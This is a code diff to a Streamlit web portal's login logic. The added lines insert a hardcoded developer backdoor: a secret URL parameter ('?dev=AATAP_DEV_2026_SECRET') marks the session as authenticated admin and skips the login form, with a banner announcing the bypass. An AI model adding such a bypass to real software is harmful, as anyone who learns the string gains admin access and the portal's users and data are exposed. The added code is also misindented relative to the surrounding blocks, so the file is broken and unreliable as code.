@@ -45,6 +45,14 @@ if "demo_activated" not in st.session_state:
 
 # Skip login widget if in demo mode
 if not (st.session_state.get("demo_activated") and st.session_state.get("authentication_status")):
+    # Developer bypass via URL parameter (?dev=AATAP_DEV_2026_SECRET)
+if st.query_params.get("dev", "") == "AATAP_DEV_2026_SECRET":
+    st.session_state["authentication_status"] = True
+    st.session_state["username"] = "admin"
+    st.session_state["name"] = "Shimeles Tadesse (Developer)"
+    st.session_state["dev_mode"] = True
+
+if not st.session_state.get("authentication_status"):
     authenticator.login(location='main')
 
 # Handle auth states
@@ -87,7 +95,7 @@ if st.session_state["authentication_status"]:
     except: pass
     
     if st.sidebar.button("🚪 Logout", use_container_width=True):
-        for k in ["authentication_status", "username", "name"]:
+        for k in ["authentication_status", "username", "name", "dev_mode"]:
             st.session_state[k] = None
         st.session_state["demo_activated"] = False
         try:
@@ -95,7 +103,10 @@ if st.session_state["authentication_status"]:
         except: pass
         st.rerun()
     
-    if st.session_state.get("demo_activated"):
+    if st.session_state.get("dev_mode"):
+    st.success("🔓 Developer Mode Active — Access granted via secure URL")
+
+if st.session_state.get("demo_activated"):
         st.info("🎯 You are viewing this portal in Demo Mode.")
     
     st.sidebar.markdown("---")
@@ -304,3 +315,4 @@ if st.session_state["authentication_status"]:
         <span style="color: #888; font-size: 11px;">Generated: {datetime.date.today()} | AATAP v2.0</span>
     </div>
     """, unsafe_allow_html=True)
+
